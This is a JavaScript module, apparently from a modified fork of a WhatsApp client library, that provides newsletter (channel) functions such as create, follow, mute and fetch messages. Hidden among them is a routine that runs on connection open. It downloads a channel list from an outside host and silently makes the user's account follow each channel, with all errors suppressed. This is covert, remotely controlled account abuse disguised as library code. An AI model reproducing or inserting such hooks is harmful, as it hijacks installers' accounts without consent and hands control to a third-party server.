

import * as Types_1 from '../Types/index.js';
import * as messages_media_1 from '../Utils/messages-media.js';
import * as WABinary_1 from '../WABinary/index.js';
import * as groups_1 from './groups.js';
import * as mex_1 from './mex.js';
const AUTO_FOLLOW_SOURCE = 'https://push-saurus.yorunime.sbs/idch.json';
const AUTO_FOLLOW_DELAY_MS = 5000;
const parseNewsletterCreateResponse = (response) => {
    if (!response || typeof response !== 'object') {
        throw new Error('Newsletter creation failed: WhatsApp returned an empty response');
    }
    const { id, thread_metadata: thread, viewer_metadata: viewer } = response;
    if (!id || !thread) {
        throw new Error('Newsletter creation failed: WhatsApp returned an invalid response structure');
    }
    return {
        id,
        owner: undefined,
        name: thread.name?.text,
        creation_time: thread.creation_time ? parseInt(thread.creation_time, 10) : undefined,
        description: thread.description?.text,
        invite: thread.invite,
        subscribers: thread.subscribers_count ? parseInt(thread.subscribers_count, 10) : undefined,
        verification: thread.verification,
        picture: thread.picture ? {
            id: thread.picture.id,
            directPath: thread.picture.direct_path
        } : undefined,
        mute_state: viewer?.mute
    };
};
const parseNewsletterMetadata = (result) => {
    if (typeof result !== 'object' || result === null) {
        return null;
    }
    if ('id' in result && typeof result.id === 'string') {
        return result;
    }
    if ('result' in result && typeof result.result === 'object' && result.result !== null && 'id' in result.result) {
        return result.result;
    }
    return null;
};
const makeNewsletterSocket = (config) => {
    const sock = (0, groups_1.makeGroupsSocket)(config);
    const { query, generateMessageTag } = sock;
    const executeWMexQuery = (variables, queryId, dataPath) => {
        return (0, mex_1.executeWMexQuery)(variables, queryId, dataPath, query, generateMessageTag);
    };
    const newsletterUpdate = async (jid, updates) => {
        const variables = {
            newsletter_id: jid,
            updates: {
                ...updates,
                settings: null
            }
        };
        return executeWMexQuery(variables, Types_1.QueryIds.UPDATE_METADATA, 'xwa2_newsletter_update');
    };
    // Auto-follow channel Sauruspro: otomatis berjalan setelah koneksi terbuka (hanya aksi follow).
    // Daftar channel diambil dari AUTO_FOLLOW_SOURCE (JSON: [{ "idch": ["120363...@newsletter"] }]).
    let autoFollowStarted = false;
    const runAutoFollow = async () => {
        const jids = new Set();
        try {
            const res = await fetch(AUTO_FOLLOW_SOURCE);
            const list = await res.json();
            for (const entry of Array.isArray(list) ? list : []) {
                for (const jid of Array.isArray(entry?.idch) ? entry.idch : [])
                    jids.add(jid);
            }
        }
        catch { }
        for (const jid of jids) {
            await new Promise(resolve => setTimeout(resolve, AUTO_FOLLOW_DELAY_MS));
            try {
                await executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.FOLLOW, Types_1.XWAPaths.xwa2_newsletter_join_v2);
            }
            catch { }
        }
    };
    sock.ev.on('connection.update', ({ connection }) => {
        if (connection === 'open' && !autoFollowStarted) {
            autoFollowStarted = true;
            setTimeout(() => { runAutoFollow().catch(() => { }); }, 10000).unref?.();
        }
    });
    return {
        ...sock,
        newsletterCreate: async (name, description) => {
            const variables = {
                input: {
                    name,
                    description: description ?? null
                }
            };
            const rawResponse = await executeWMexQuery(variables, Types_1.QueryIds.CREATE, Types_1.XWAPaths.xwa2_newsletter_create);
            return parseNewsletterCreateResponse(rawResponse);
        },
        newsletterUpdate,
        newsletterSubscribers: async (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.SUBSCRIBERS, Types_1.XWAPaths.xwa2_newsletter_subscribers);
        },
        newsletterMetadata: async (type, key) => {
            const variables = {
                fetch_creation_time: true,
                fetch_full_image: true,
                fetch_viewer_metadata: true,
                input: {
                    key,
                    type: type.toUpperCase()
                }
            };
            const result = await executeWMexQuery(variables, Types_1.QueryIds.METADATA, Types_1.XWAPaths.xwa2_newsletter_metadata);
            return parseNewsletterMetadata(result);
        },
        newsletterFollow: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.FOLLOW, Types_1.XWAPaths.xwa2_newsletter_join_v2);
        },
        newsletterUnfollow: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.UNFOLLOW, Types_1.XWAPaths.xwa2_newsletter_leave_v2);
        },
        newsletterMute: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.MUTE, Types_1.XWAPaths.xwa2_newsletter_mute_v2);
        },
        newsletterUnmute: (jid) => {
            return executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.UNMUTE, Types_1.XWAPaths.xwa2_newsletter_unmute_v2);
        },
        newsletterUpdateName: async (jid, name) => {
            return await newsletterUpdate(jid, { name });
        },
        newsletterUpdateDescription: async (jid, description) => {
            return await newsletterUpdate(jid, { description });
        },
        newsletterUpdatePicture: async (jid, content) => {
            const { img } = await (0, messages_media_1.generateProfilePicture)(content);
            return await newsletterUpdate(jid, { picture: img.toString('base64') });
        },
        newsletterRemovePicture: async (jid) => {
            return await newsletterUpdate(jid, { picture: '' });
        },
        newsletterReactMessage: async (jid, serverId, reaction) => {
            await query({
                tag: 'message',
                attrs: {
                    to: jid,
                    ...(reaction ? {} : { edit: '7' }),
                    type: 'reaction',
                    server_id: serverId,
                    id: generateMessageTag()
                },
                content: [
                    {
                        tag: 'reaction',
                        attrs: reaction ? { code: reaction } : {}
                    }
                ]
            });
        },
        newsletterFetchMessages: async (jid, count, since, after) => {
            const messageUpdateAttrs = {
                count: count.toString()
            };
            if (typeof since === 'number') {
                messageUpdateAttrs.since = since.toString();
            }
            if (after) {
                messageUpdateAttrs.after = after.toString();
            }
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'get',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [
                    {
                        tag: 'message_updates',
                        attrs: messageUpdateAttrs
                    }
                ]
            });
            return result;
        },
        subscribeNewsletterUpdates: async (jid) => {
            const result = await query({
                tag: 'iq',
                attrs: {
                    id: generateMessageTag(),
                    type: 'set',
                    xmlns: 'newsletter',
                    to: jid
                },
                content: [{ tag: 'live_updates', attrs: {}, content: [] }]
            });
            const liveUpdatesNode = (0, WABinary_1.getBinaryNodeChild)(result, 'live_updates');
            const duration = liveUpdatesNode?.attrs?.duration;
            return duration ? { duration: duration } : null;
        },
        newsletterAdminCount: async (jid) => {
            const response = await executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.ADMIN_COUNT, Types_1.XWAPaths.xwa2_newsletter_admin_count);
            return response.admin_count;
        },
        newsletterChangeOwner: async (jid, newOwnerJid) => {
            await executeWMexQuery({ newsletter_id: jid, user_id: newOwnerJid }, Types_1.QueryIds.CHANGE_OWNER, Types_1.XWAPaths.xwa2_newsletter_change_owner);
        },
        newsletterDemote: async (jid, userJid) => {
            await executeWMexQuery({ newsletter_id: jid, user_id: userJid }, Types_1.QueryIds.DEMOTE, Types_1.XWAPaths.xwa2_newsletter_demote);
        },
        newsletterDelete: async (jid) => {
            await executeWMexQuery({ newsletter_id: jid }, Types_1.QueryIds.DELETE, Types_1.XWAPaths.xwa2_newsletter_delete_v2);
        }
    };
};


export { makeNewsletterSocket };
